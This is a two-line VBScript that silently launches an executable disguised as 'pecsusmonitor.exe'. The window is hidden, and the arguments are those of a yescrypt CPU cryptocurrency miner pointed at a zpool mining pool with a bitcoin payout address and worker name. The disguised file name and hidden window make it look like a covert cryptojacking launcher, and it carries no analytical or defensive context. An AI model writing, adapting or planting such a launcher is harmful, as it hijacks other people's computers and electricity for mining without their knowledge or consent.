set objshell = wscript.createobject("wscript.shell")
 objshell.run("c:\pecsusmonitor\pecsusmonitor.exe -a yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u bc1qdxss06rveesydtjxqy8mj7rch3lj4h76d8wt39 -p PC_6510 -t 2 --cpu-affinity=0,1"),0, true